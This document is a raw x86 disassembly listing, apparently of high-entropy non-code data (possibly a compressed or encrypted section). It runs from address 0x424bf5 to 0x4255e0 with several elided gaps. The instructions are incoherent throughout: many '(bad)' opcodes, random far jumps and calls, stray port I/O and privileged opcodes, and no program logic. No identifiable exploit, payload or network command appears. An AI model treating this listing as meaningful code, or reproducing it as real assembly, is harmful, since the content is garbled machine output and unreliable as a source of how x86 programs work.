  424bf5:	and    esi,eax
  424bf7:	lds    eax,FWORD PTR [edx+0x45]
  424bfa:	repnz push ss
  424bfc:	mov    dh,0xd5
  424bfe:	fld    TBYTE PTR [ecx]
  424c00:	push   esi
  424c01:	fdiv   DWORD PTR [ecx+esi*4+0x641590cc]
  424c08:	push   es
  424c09:	outs   dx,DWORD PTR ds:[esi]
  424c0a:	leave  
  424c0b:	xchg   ebx,eax
  424c0c:	pusha  
  424c0d:	fldenv [esi]
  424c0f:	and    BYTE PTR [edx],dl
  424c11:	js     0x424c78
  424c13:	or     BYTE PTR [eax-0xf],ch
  424c16:	cmp    eax,0xf6ccea57
  424c1b:	add    edx,esp
  424c1d:	dec    edi
  424c1e:	pop    edi
  424c1f:	dec    esi
  424c20:	dec    edx
  424c21:	sbb    DWORD PTR [ebp-0x7e],edx
  424c24:	mov    ecx,DWORD PTR [edi]
  424c26:	xor    ecx,DWORD PTR [esi]
  424c28:	xor    al,0x89
  424c2a:	fs dec ebp
  424c2c:	jp     0x424c9d
  424c2e:	jne    0x424bcc
  424c30:	stos   BYTE PTR es:[edi],al
  424c31:	add    al,dl
  424c33:	add    DWORD PTR [ecx-0x16],esp
  424c36:	mov    ebp,0x112ded2a
  424c3b:	xor    al,bh
  424c3d:	call   0x4972ac61
  424c42:	adc    al,0x4b
  424c44:	outs   dx,DWORD PTR ds:[esi]
  424c45:	pop    es
  424c46:	xor    esp,esp
  424c48:	xchg   ecx,eax
  424c49:	retf   0xf00b
  424c4c:	mov    eax,0x1e1cae60
  424c51:	retf   0x6b89
  424c54:	fidiv  WORD PTR [ecx+0x30]
  424c57:	push   ebx
  424c58:	inc    ebp
  424c59:	pop    ecx
  424c5a:	adc    al,0xc7
  424c5c:	std    
  424c5d:	inc    eax
  424c5e:	and    eax,DWORD PTR [ebp+0x1e5eae2d]
  424c64:	jno    0x424bf5
  424c66:	not    dh
  424c68:	repnz pop esp
  424c6a:	inc    edi
  424c6b:	out    dx,eax
  424c6c:	add    eax,0x22f7e4c6
  424c71:	neg    DWORD PTR [esi-0x6e]
  424c74:	jle    0x424c93
  424c76:	cdq    
  424c77:	and    eax,0xb19e3f6b
  424c7c:	and    eax,0x1e1a1409
  424c81:	rol    DWORD PTR [esi-0x1d7eef2c],cl
  424c87:	hlt    
  424c88:	div    DWORD PTR [edx-0x6df7f3c7]
  424c8e:	pop    eax
  424c8f:	sub    bl,BYTE PTR [ecx]
  424c91:	xchg   ebp,eax
  424c92:	mov    eax,DWORD PTR [ecx+0x2b04620e]
  424c98:	sub    esp,DWORD PTR [edx+0x14ef9590]
  424c9e:	(bad)  
  424c9f:	outs   dx,DWORD PTR ds:[esi]
  424ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ca1:	cli    
  424ca2:	sbb    DWORD PTR [edx-0x5b],eax
  424ca5:	or     esi,DWORD PTR [ecx]
  424ca7:	jmp    0x67bfb263
  424cac:	int    0x34
  424cae:	and    edi,DWORD PTR [esi+0x7497c2]
  424cb4:	or     BYTE PTR [edi-0x41],0xcd
  424cb8:	mov    edx,0xf0846fe1
  424cbd:	and    eax,0x90a190f6
  424cc2:	xor    DWORD PTR [edi-0x51374ae0],0xfffffff9
  424cc9:	inc    eax
  424cca:	daa    
  424ccb:	outs   dx,DWORD PTR ds:[esi]
  424ccc:	cmp    BYTE PTR [edi-0x26],dl
  424ccf:	out    dx,eax
  424cd0:	pop    eax
  424cd1:	mov    al,ds:0xff0293d4
  424cd6:	gs addr16 into 
  424cd9:	outs   dx,BYTE PTR ds:[esi]
  424cda:	jmp    FWORD PTR [ecx]
  424cdc:	lods   al,BYTE PTR ds:[esi]
  424cdd:	pusha  
  424cde:	sbb    BYTE PTR [ebx-0x74],dl
  424ce1:	test   ah,0x43
  424ce4:	sbb    eax,0xc3e6467
  424ce9:	aam    0x88
  424ceb:	mov    ebp,0x944f
	...
  424d54:	add    BYTE PTR [eax],al
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0x62db51a8]
  424d64:	fisttp WORD PTR [ebx]
  424d66:	mov    eax,DWORD PTR [bx+di]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [ebx+0x35],bl
  424d70:	push   eax
  424d71:	and    edi,DWORD PTR [edx-0x6d]
  424d74:	mov    dh,0x7d
  424d76:	jne    0x424d90
  424d78:	dec    edi
  424d79:	dec    esp
  424d7a:	outs   dx,DWORD PTR ds:[esi]
  424d7b:	out    0xd9,eax
  424d7d:	pop    edx
  424d7e:	jg     0x424dc1
  424d80:	imul   BYTE PTR [eax-0x552040eb]
  424d86:	or     al,0x84
  424d88:	pop    edi
  424d89:	push   edx
  424d8a:	mov    bh,0x74
  424d8c:	or     al,0xf4
  424d8e:	inc    ebp
  424d8f:	sub    eax,DWORD PTR [ebp-0x20]
  424d92:	std    
  424d93:	push   es
  424d94:	sbb    BYTE PTR ds:0x310ff975,bh
  424d9a:	add    al,0x86
  424d9c:	push   edx
  424d9d:	lahf   
  424d9e:	das    
  424d9f:	ret    0x9730
  424da2:	out    dx,eax
  424da3:	sub    DWORD PTR [eax-0x28],esp
  424da6:	mov    dl,0x8f
  424da8:	mov    edx,0x51930708
  424dad:	call   0xb368:0xb706a9f6
  424db4:	call   0x3285e88e
  424db9:	not    BYTE PTR [eax+0x2734f52b]
  424dbf:	push   esp
  424dc0:	sar    BYTE PTR [edi+0x31],cl
  424dc3:	sbb    eax,0xa1065fbf
  424dc8:	pop    es
  424dc9:	mov    dl,0xdc
  424dcb:	loopne 0x424dae
  424dcd:	adc    eax,0x44b707c1
  424dd2:	out    dx,al
  424dd3:	cdq    
  424dd4:	push   es
  424dd5:	test   al,0x43
  424dd7:	cmc    
  424dd8:	js     0x424d75
  424dda:	fdiv   st(7),st
  424ddc:	inc    ebx
  424dde:	add    eax,0x163e736a
  424de3:	pop    eax
  424de4:	pushf  
  424de5:	jne    0x424e3f
  424de7:	loope  0x424d9d
  424de9:	js     0x424e5b
  424deb:	cmp    eax,0x128dec7b
  424df0:	shr    esp,1
  424df2:	cmp    DWORD PTR [eax+0x71517c6f],edi
  424df8:	loop   0x424e55
  424dfa:	retf   
  424dfb:	(bad)  
  424dfc:	(bad)  [ebx]
  424dfe:	or     esi,DWORD PTR [ecx+0x7d]
  424e01:	test   al,0xb7
  424e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e04:	xchg   DWORD PTR [eax],ebx
  424e06:	xchg   esi,eax
  424e07:	into   
  424e08:	lahf   
  424e09:	jg     0x424e6d
  424e0b:	mov    ds:0xa4e14def,al
  424e10:	jnp    0x424e7b
  424e12:	inc    esi
  424e13:	ins    BYTE PTR es:[edi],dx
  424e14:	adc    DWORD PTR [ebx+0x5c],0xe6a764d5
  424e1b:	push   0x6a2f0f08
  424e20:	mov    al,ds:0x4192d4d1
  424e25:	adc    DWORD PTR [edx],edi
  424e27:	or     al,0xed
  424e29:	push   cs
  424e2a:	add    eax,0x6111bc68
  424e2f:	aas    
  424e30:	push   edx
  424e31:	inc    esp
  424e32:	loope  0x424e66
  424e34:	or     DWORD PTR [eax-0xe],edx
  424e37:	ss (bad) 
  424e39:	out    0x23,al
  424e3b:	xchg   edx,eax
  424e3c:	push   ecx
  424e3d:	mov    DWORD PTR [eax-0x45b97bdb],esi
  424e43:	push   esp
  424e44:	repz pop ebx
  424e46:	or     cl,ch
  424e48:	aad    0xe3
  424e4a:	mov    cl,0xb9
  424e4c:	inc    esp
  424e4d:	adc    eax,0xfc6702e9
  424e52:	xchg   edx,eax
  424e53:	dec    ebp
  424e54:	imul   ebp
  424e56:	cmp    DWORD PTR [esi],eax
  424e58:	aas    
  424e59:	push   ss
  424e5a:	or     BYTE PTR [edx+0x3e],ah
  424e5d:	in     al,0xa8
  424e5f:	add    bh,BYTE PTR [esi+0x45]
  424e62:	out    0xac,al
  424e64:	hlt    
  424e65:	mov    esp,0xf0b1d2a6
  424e6a:	xor    al,0x70
  424e6c:	test   BYTE PTR [eax+eax*1+0x0],bl
	...
  424ed3:	add    BYTE PTR [eax],al
  424ed5:	add    BYTE PTR ds:0xf361d20c,bh
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424e74
  424ee3:	add    ebx,DWORD PTR [ebp-0x28]
  424ee6:	mov    WORD PTR [bx+di],es
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    BYTE PTR [ecx-0x74],ah
  424ef0:	loope  0x424f29
  424ef2:	pop    esp
  424ef3:	aaa    
  424ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ef5:	or     bl,BYTE PTR [esi+eiz*1+0x471169ff]
  424efc:	lods   eax,DWORD PTR ds:[esi]
  424efd:	xlat   BYTE PTR ds:[ebx]
  424efe:	dec    ebx
  424eff:	(bad)  
  424f00:	repnz adc al,0x54
  424f03:	jp     0x424e8a
  424f05:	push   ds
  424f06:	test   al,0xf4
  424f08:	(bad)  
  424f0a:	ds retf 
  424f0c:	mov    BYTE PTR [ecx+0x506a3efe],ah
  424f12:	iret   
  424f13:	out    dx,eax
  424f14:	push   edx
  424f15:	jg     0x424f01
  424f17:	push   ss
  424f18:	jns    0x424f16
  424f1a:	sub    eax,0xea100317
  424f1f:	xchg   cl,al
  424f21:	or     al,0x29
  424f23:	lods   eax,DWORD PTR ds:[esi]
  424f24:	in     al,0xe6
  424f26:	mov    ah,0xd1
  424f28:	pop    edi
  424f29:	aad    0x9
  424f2b:	mov    esp,0x4239a1e
  424f30:	xchg   edi,eax
  424f31:	sub    al,0x6c
  424f33:	xchg   BYTE PTR [ecx+0x6d4513b2],dh
  424f39:	xor    al,0xe0
  424f3b:	sahf   
  424f3c:	stos   BYTE PTR es:[edi],al
  424f3d:	mov    bh,0x1f
  424f3f:	(bad)  
  424f40:	rcl    DWORD PTR [esi+0x3e],cl
  424f43:	jne    0x424f3c
  424f45:	sar    DWORD PTR [eax+0x41e9e755],1
  424f4b:	xor    BYTE PTR [esi],bh
  424f4d:	repz pop ebp
  424f4f:	push   ecx
  424f50:	push   ds
  424f51:	jp     0x424fb3
  424f53:	cs (bad) 
  424f56:	and    al,0xbb
  424f58:	(bad)  [edx-0x7f]
  424f5b:	fnstcw WORD PTR [ecx-0x3d95e71f]
  424f61:	inc    ecx
  424f62:	sbb    BYTE PTR [edx+0x79360752],cl
  424f68:	rcl    ebx,cl
  424f6a:	rol    dh,0xde
  424f6d:	push   ss
  424f6e:	outs   dx,BYTE PTR ds:[esi]
  424f6f:	fmul   st(2),st
  424f71:	mov    cl,0xc0
  424f73:	idiv   DWORD PTR [edx+0x25]
  424f76:	ja     0x424f5a
  424f78:	inc    esp
  424f79:	inc    eax
  424f7a:	aam    0x30
  424f7c:	loop   0x424f8c
  424f7e:	aad    0xed
  424f80:	ret    0xad83
  424f83:	mov    cl,BYTE PTR [ebp+0x52]
  424f86:	adc    DWORD PTR [edi],ecx
  424f88:	xchg   ebx,eax
  424f89:	les    edi,FWORD PTR [edi-0x49]
  424f8c:	pop    esi
  424f8d:	pop    ebp
  424f8e:	cmp    eax,0x5275a174
  424f93:	inc    esp
  424f94:	fcomp  QWORD PTR [edx]
  424f96:	fstp   TBYTE PTR [ebx]
  424f98:	and    edx,eax
  424f9a:	aad    0x22
  424f9c:	and    esi,ecx
  424f9e:	je     0x424f9c
  424fa0:	or     ch,0xfe
  424fa3:	in     al,dx
  424fa4:	popa   
  424fa5:	cs (bad) 
  424fa7:	retf   
  424fa8:	lods   al,BYTE PTR ds:[esi]
  424fa9:	sahf   
  424faa:	out    dx,eax
  424fab:	mov    bl,0x24
  424fad:	pop    ecx
  424fae:	cli    
  424faf:	pop    ebp
  424fb0:	sub    dl,BYTE PTR [esi-0x1e]
  424fb3:	mov    esi,0xed44de81
  424fb8:	shr    ah,cl
  424fba:	scas   eax,DWORD PTR es:[edi]
  424fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fbc:	sub    al,0x2f
  424fbe:	mov    al,ds:0x402127e
  424fc3:	or     eax,0x9ae0d834
  424fc8:	stc    
  424fc9:	or     DWORD PTR [ebx+0x50],ebx
  424fcc:	push   ebp
  424fcd:	or     cl,BYTE PTR [esi+0x39bce737]
  424fd3:	adc    bh,ah
  424fd5:	ins    DWORD PTR es:[edi],dx
  424fd6:	(bad)  
  424fd7:	(bad)  
  424fd8:	cmp    DWORD PTR [edi+0x1e52f439],esp
  424fde:	inc    esp
  424fdf:	bound  ax,DWORD PTR [ebp-0x13]
  424fe3:	add    al,0x7f
  424fe5:	aaa    
  424fe6:	dec    eax
  424fe7:	or     DWORD PTR [ecx-0x5620d164],edx
  424fed:	rol    DWORD PTR [eax],1
	...
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	or     BYTE PTR [ebp-0x7298d357],cl
  425068:	add    DWORD PTR [eax],eax
  42506a:	add    BYTE PTR [ecx],al
  42506c:	add    BYTE PTR [eax],al
  42506e:	xlat   BYTE PTR ds:[ebx]
  42506f:	pop    ebp
  425070:	fcmovnu st,st(2)
  425072:	adc    eax,0xf5a1d832
  425077:	int3   
  425078:	sub    esp,DWORD PTR [edx+eax*1]
  42507b:	(bad)  
  42507c:	sti    
  42507d:	call   0x1683e4ed
  425082:	fwait
  425083:	clc    
  425084:	nop
  425085:	daa    
  425086:	cmp    DWORD PTR [edx+0x343f3220],ecx
  42508c:	push   es
  42508d:	gs xor al,0x3
  425090:	mov    ebx,0xd597711d
  425095:	inc    esp
  425096:	push   eax
  425097:	je     0x4250f1
  425099:	not    DWORD PTR [ebx]
  42509b:	add    ch,BYTE PTR [ebx-0x72]
  42509e:	push   0x23
  4250a0:	rcr    ah,cl
  4250a2:	stc    
  4250a3:	jbe    0x4250ce
  4250a5:	loop   0x42504f
  4250a7:	lods   eax,DWORD PTR ds:[esi]
  4250a8:	imul   esi,DWORD PTR [edi],0x4d
  4250ab:	lods   eax,DWORD PTR ds:[esi]
  4250ac:	and    ebx,DWORD PTR [ecx-0x60]
  4250af:	test   DWORD PTR [eax+0x1e497e5b],edi
  4250b5:	mov    cl,BYTE PTR [edx-0x29]
  4250b8:	stos   DWORD PTR es:[edi],eax
  4250b9:	mov    esi,0xdf81f0f0
  4250be:	xchg   edi,eax
  4250bf:	pusha  
  4250c0:	push   edi
  4250c1:	mov    DWORD PTR [edx],eax
  4250c3:	sar    BYTE PTR [edi],cl
  4250c5:	add    ebx,DWORD PTR [ebx+eax*1]
  4250c8:	mov    ds:0x879bed40,al
  4250cd:	jnp    0x4250c0
  4250cf:	push   cs
  4250d0:	test   BYTE PTR [esi+0x6c],bh
  4250d3:	call   0xbeaf:0x89f8bf5e
  4250da:	inc    ecx
  4250db:	jmp    0x4250c1
  4250dd:	mov    ch,0x46
  4250df:	inc    eax
  4250e0:	sbb    eax,0x1c5d4437
  4250e5:	in     eax,dx
  4250e6:	ror    BYTE PTR [eax+0x3a],cl
  4250e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250ea:	les    ebx,FWORD PTR [edi-0x67]
  4250ed:	sbb    al,BYTE PTR [ebx]
  4250ef:	jmp    0xb3877bcc
  4250f4:	adc    ch,ch
  4250f6:	in     al,dx
  4250f7:	sub    edx,DWORD PTR [ebx]
  4250f9:	push   es
  4250fa:	inc    esp
  4250fb:	push   esp
  4250fc:	fs jbe 0x42508f
  4250ff:	cmp    dh,BYTE PTR [edi]
  425101:	shr    DWORD PTR [edx],cl
  425103:	xchg   edx,eax
  425104:	lock mov bh,0xf1
  425107:	mov    ecx,esp
  425109:	and    edi,DWORD PTR [ecx-0x5]
  42510c:	push   ss
  42510d:	je     0x4250aa
  42510f:	fwait
  425110:	adc    al,0x3a
  425112:	ds cdq 
  425114:	pop    ebx
  425115:	outs   dx,BYTE PTR ds:[esi]
  425116:	stc    
  425117:	xor    edx,DWORD PTR ds:0xa9554415
  42511d:	add    dl,BYTE PTR [eax+0x5b]
  425120:	gs fs mov ?,ebp
  425124:	jnp    0x4250cd
  425126:	inc    eax
  425127:	xchg   edx,eax
  425128:	add    al,0x76
  42512a:	mov    ds:0x2fd0ca19,eax
  42512f:	dec    esi
  425130:	pop    ecx
  425131:	pushf  
  425132:	dec    ebx
  425133:	leave  
  425134:	jae    0x4251ad
  425136:	sbb    eax,0x898be1ce
  42513b:	inc    ebp
  42513c:	mov    ch,0x2d
  42513e:	fsincos 
  425140:	mov    ah,0xd9
  425142:	mov    ds:0x5e880d7,eax
  425147:	mov    bl,0xb1
  425149:	dec    edi
  42514a:	cmp    dl,0x95
  42514d:	mov    ah,0x94
  42514f:	int3   
  425150:	popf   
  425151:	pop    esp
  425152:	aas    
  425153:	push   esi
  425154:	retf   
  425155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425156:	retf   0xb53
  425159:	and    DWORD PTR [ebp+0xe65069e],esp
  42515f:	add    ebx,DWORD PTR [esi+0x2472ec6f]
  425165:	stc    
  425166:	jbe    0x425140
  425168:	or     esi,DWORD PTR [edi-0x4128e62]
	...
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xec60:0x9a8592e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [eax-0x4504a473],ch
  4251f3:	jbe    0x42525e
  4251f5:	mov    ds:0x37dbe6a4,eax
  4251fa:	inc    ebx
  4251fb:	aaa    
  4251fc:	jg     0x4251e4
  4251fe:	jge    0x42520c
  425200:	loope  0x42522e
  425202:	xchg   ebx,eax
  425203:	xchg   edx,eax
  425204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425205:	mov    BYTE PTR ds:0x468b8c49,0xc2
  42520c:	mov    dl,0x3f
  42520e:	lahf   
  42520f:	je     0x4251b4
  425211:	dec    edx
  425212:	inc    ebp
  425213:	or     BYTE PTR [edi],cl
  425215:	outs   dx,BYTE PTR ds:[esi]
  425216:	mov    ebx,eax
  425218:	fwait
  425219:	push   es
  42521a:	imul   edx,DWORD PTR [edi+esi*4-0x10],0x41
  42521f:	stc    
  425220:	sub    al,0x14
  425222:	mov    bh,0xce
  425224:	inc    esi
  425225:	mov    edi,0x91966453
  42522a:	das    
  42522b:	clc    
  42522c:	push   ecx
  42522d:	in     eax,0x10
  42522f:	call   0x2627:0xeb319793
  425236:	dec    eax
  425237:	push   eax
  425238:	mov    dl,al
  42523a:	fwait
  42523b:	mov    edx,0x2b4344e7
  425240:	aas    
  425241:	jp     0x4251e9
  425243:	icebp  
  425244:	call   DWORD PTR ds:0xd162658
  42524a:	ds ret 
  42524c:	mov    ah,0x13
  42524e:	fwait
  42524f:	repnz pop esi
  425251:	mov    ebx,0x75d35da0
  425256:	xchg   ebp,eax
  425257:	xor    al,0xce
  425259:	jmp    0x2c98:0xa3c7b0ee
  425260:	mov    bh,0x32
  425262:	fwait
  425263:	ror    ebp,1
  425265:	mov    ebx,0x8dfe892a
  42526a:	xchg   ecx,eax
  42526b:	cdq    
  42526c:	jbe    0x425213
  42526e:	dec    eax
  42526f:	int    0xa1
  425271:	push   esp
  425272:	retf   
  425273:	sti    
  425274:	lahf   
  425275:	stos   DWORD PTR es:[edi],eax
  425276:	mov    esp,0x42dcac34
  42527b:	int    0x4e
  42527d:	xor    DWORD PTR [edx-0x4702015a],ebx
  425283:	out    0x2,al
  425285:	cmp    al,0x20
  425287:	aaa    
  425288:	shl    DWORD PTR [edx+0x7422b975],0x43
  42528f:	fmul   QWORD PTR [esi-0x186c9e44]
  425295:	push   edi
  425296:	jne    0x4252e7
  425298:	mov    eax,DWORD PTR ds:0x735e5744
  42529e:	jp     0x4252d1
  4252a0:	jae    0x425296
  4252a2:	jb     0x4252ea
  4252a4:	int    0xae
  4252a6:	call   0x2a0a:0x1618cc90
  4252ad:	leave  
  4252ae:	jo     0x425242
  4252b0:	inc    edi
  4252b1:	sbb    al,0xcf
  4252b3:	and    ch,BYTE PTR [eax]
  4252b5:	jge    0x42532c
  4252b7:	pop    edi
  4252b8:	repz inc eax
  4252ba:	lahf   
  4252bb:	mov    ds:0xc39a0c53,al
  4252c0:	add    BYTE PTR [edx],al
  4252c2:	inc    ebp
  4252c3:	imul   DWORD PTR [edx+0x6ab24228]
  4252c9:	fdiv   DWORD PTR [ebx-0x234a56ec]
  4252cf:	xchg   edi,eax
  4252d0:	push   edi
  4252d1:	lods   al,BYTE PTR ds:[esi]
  4252d2:	and    bl,BYTE PTR [ecx+0x7e]
  4252d5:	jo     0x4252bc
  4252d7:	and    esp,esi
  4252d9:	lods   eax,DWORD PTR ds:[esi]
  4252da:	imul   esi,eax,0x29
  4252dd:	aad    0xb5
  4252df:	pusha  
  4252e0:	fstp   QWORD PTR [ebp*8+0x6e6609de]
  4252e7:	pop    eax
  4252e8:	cdq    
  4252e9:	out    0x94,al
  4252eb:	adc    eax,ebx
  4252ed:	pusha  
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	and    eax,0x67dc1b7e
  425367:	pop    DWORD PTR [ecx]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR ds:0xe5109eb3,ch
  425373:	(bad)
  425376:	sub    BYTE PTR [eax-0x10],bh
  425379:	sub    eax,0xae4ce1c6
  42537e:	sub    ebx,ebp
  425380:	inc    ebp
  425381:	aaa    
  425382:	dec    ebp
  425383:	xlat   BYTE PTR ds:[ebx]
  425384:	je     0x42530a
  425386:	sbb    BYTE PTR [esi],cl
  425388:	or     eax,DWORD PTR [edx+0x7a]
  42538b:	scas   al,BYTE PTR es:[edi]
  42538c:	mov    dh,0x0
  42538e:	add    al,ch
  425390:	das    
  425391:	push   edi
  425392:	sbb    DWORD PTR [edi],ebp
  425394:	push   esi
  425395:	jle    0x4253dc
  425397:	in     al,dx
  425398:	push   esp
  425399:	je     0x425363
  42539b:	jmp    0xe67d:0xaf8927a4
  4253a2:	adc    al,0x86
  4253a4:	cmp    ebp,DWORD PTR [ecx]
  4253a6:	add    eax,0xe29511b4
  4253ab:	xor    eax,0xf3220d69
  4253b0:	sub    eax,0x2c98b8c
  4253b5:	add    bl,0x78
  4253b8:	xlat   BYTE PTR ds:[ebx]
  4253b9:	adc    DWORD PTR [eax-0x741d2f06],edx
  4253bf:	mov    edx,0x389a346
  4253c4:	jb     0x42534a
  4253c6:	cmc    
  4253c7:	stc    
  4253c8:	xor    dl,BYTE PTR [eax-0x572ce3e6]
  4253ce:	fcom   QWORD PTR [ebp+ebx*2+0x60]
  4253d2:	test   DWORD PTR [ecx-0x1dabb1db],ecx
  4253d8:	cmp    ecx,DWORD PTR [ebp-0x5143512a]
  4253de:	jae    0x4253e2
  4253e0:	mov    ebx,DWORD PTR [ebp+0x70a9cdd0]
  4253e6:	lods   eax,DWORD PTR ds:[esi]
  4253e7:	xlat   BYTE PTR ds:[ebx]
  4253e8:	out    0x39,eax
  4253ea:	imul   ebx,DWORD PTR [ebp-0x6fef4c4c],0xffffffdd
  4253f1:	dec    edx
  4253f2:	pop    esp
  4253f3:	inc    ebp
  4253f4:	mov    dl,BYTE PTR [edx+0x73201357]
  4253fa:	xor    bl,bl
  4253fc:	lea    esi,[esi-0xe679e1d]
  425402:	push   edx
  425403:	and    eax,0xf3c8713e
  425408:	pop    eax
  425409:	or     BYTE PTR [eax+0x6],bl
  42540c:	dec    esi
  42540d:	jo     0x425458
  42540f:	mov    ebp,0x7d9c1c38
  425414:	daa    
  425415:	jle    0x425439
  425417:	es cwde 
  425419:	xchg   ebp,eax
  42541a:	in     eax,0xe3
  42541c:	xchg   ebp,eax
  42541d:	sub    bh,al
  42541f:	leave  
  425420:	(bad)  
  425421:	and    al,BYTE PTR [ecx+0x580060c0]
  425427:	xchg   ebx,eax
  425428:	hlt    
  425429:	mov    ah,0xfe
  42542b:	aaa    
  42542c:	or     dh,BYTE PTR [edx+0x5e]
  42542f:	xchg   esp,eax
  425430:	jge    0x42540e
  425432:	dec    ecx
  425433:	stos   BYTE PTR es:[edi],al
  425434:	or     al,0x28
  425436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425437:	jmp    0x425421
  425439:	dec    esi
  42543a:	push   ds
  42543b:	sbb    bl,BYTE PTR [edi]
  42543d:	fs dec cx
  425440:	bound  esi,QWORD PTR [esi-0x62d5afa7]
  425446:	pop    ds
  425447:	sbb    DWORD PTR [ebx],edx
  425449:	ja     0x425461
  42544b:	jo     0x425449
  42544d:	(bad)  
  42544e:	mov    eax,0x5211e7ed
  425453:	pop    ecx
  425454:	cmp    DWORD PTR ds:0x62f1cb7e,edx
  42545a:	(bad)  
  42545b:	iret   
  42545c:	rol    al,0xba
  42545f:	out    dx,al
  425460:	mov    ch,0x45
  425462:	std    
  425463:	jmp    0xb541:0xd233
  425469:	inc    ebp
  42546a:	sub    bh,BYTE PTR [edi+0xb966]
	...
  4254d4:	add    BYTE PTR [eax],al
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    ecx,ebx
  4254e3:	fsubr  QWORD PTR [ecx]
  4254e5:	inc    edi
  4254e6:	addr16 nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	scas   eax,DWORD PTR es:[edi]
  4254ef:	div    BYTE PTR [esi]
  4254f1:	lahf   
  4254f2:	retf   
  4254f3:	leave  
  4254f4:	lock les eax,FWORD PTR [esp+edx*1-0x7b]
  4254f9:	mov    cl,BYTE PTR [eax-0x31]
  4254fc:	mov    bl,0x90
  4254fe:	fisttp DWORD PTR [ecx+0x262c498c]
  425504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425505:	in     eax,0x8f
  425507:	push   ss
  425508:	das    
  425509:	push   edx
  42550a:	and    ebx,esi
  42550c:	test   eax,0x74580fc7
  425511:	jle    0x425565
  425513:	clc    
  425514:	pushf  
  425515:	jle    0x425567
  425517:	sub    al,0xb3
  425519:	and    eax,0xd73650cd
  42551e:	rcr    al,cl
  425520:	ja     0x4255a0
  425522:	ret    0xca25
  425525:	aad    0xbe
  425527:	push   eax
  425528:	out    dx,eax
  425529:	xor    ecx,ecx
  42552b:	(bad)  
  42552c:	pop    ebx
  42552d:	mov    bh,0x36
  42552f:	ss cmp al,0xa4
  425532:	rol    BYTE PTR [ebp+0x498bdb74],1
  425538:	inc    edx
  425539:	jmp    0x425569
  42553b:	test   DWORD PTR [ecx+0x35],esi
  42553e:	mov    ah,0x9a
  425540:	xlat   BYTE PTR ds:[ebx]
  425541:	inc    ebx
  425542:	(bad)  
  425543:	data16 arpl WORD PTR [eax+0x356ce3d0],si
  42554a:	mov    dl,0xfe
  42554c:	add    ebp,DWORD PTR [eax]
  42554e:	lds    edx,FWORD PTR [ecx-0x7b737b84]
  425554:	scas   eax,DWORD PTR es:[edi]
  425555:	add    bh,dh
  425557:	fstp   DWORD PTR [ecx-0xc596a2e]
  42555d:	sbb    ch,ah
  42555f:	add    al,0xc3
  425561:	mov    DWORD PTR [esi],ebp
  425563:	int    0xb9
  425565:	sti    
  425566:	int    0xe4
  425568:	push   es
  425569:	pop    es
  42556a:	jle    0x425532
  42556c:	(bad)  
  42556d:	in     al,0x79
  42556f:	pop    ss
  425570:	jns    0x4254fe
  425572:	mov    eax,DWORD PTR ds:0xb1f8bd08
  425578:	dec    eax
  425579:	sub    eax,0xe1de2e2c
  42557e:	in     eax,0x38
  425580:	add    DWORD PTR [eax+0x38eaf964],0xe35d5ed5
  42558a:	rcr    BYTE PTR [edx+eax*2-0x516d0468],1
  425591:	loopne 0x4255ca
  425593:	xchg   esi,eax
  425594:	stos   BYTE PTR es:[edi],al
  425595:	mov    DWORD PTR [ecx*1+0x4cbc7f7],esi
  42559c:	(bad)  
  42559e:	out    0xf3,eax
  4255a0:	push   es
  4255a1:	mov    eax,ds:0xafe1d57f
  4255a6:	mov    ch,0xc1
  4255a8:	adc    dh,BYTE PTR [esi]
  4255aa:	mov    esp,0x79b730e3
  4255af:	daa    
  4255b0:	lea    edi,[ebx]
  4255b2:	adc    cl,BYTE PTR [ebx-0x437f9bec]
  4255b8:	imul   esi,DWORD PTR [esi],0x6aa652b
  4255be:	das    
  4255bf:	inc    edx
  4255c0:	jmp    0xba7c395b
  4255c5:	fidiv  DWORD PTR [edx+edx*4]
  4255c8:	jmp    0x4255fb
  4255ca:	adc    al,0x3d
  4255cc:	pop    es
  4255cd:	cmp    ebp,DWORD PTR [ebp-0x76f499e3]
  4255d3:	ret    
  4255d4:	xchg   bh,ch
  4255d6:	dec    esi
  4255d7:	mov    edx,0x885d6204
  4255dc:	ins    BYTE PTR es:[edi],dx
  4255dd:	add    dh,bh
  4255df:	pop    ss
  4255e0:	(bad)  
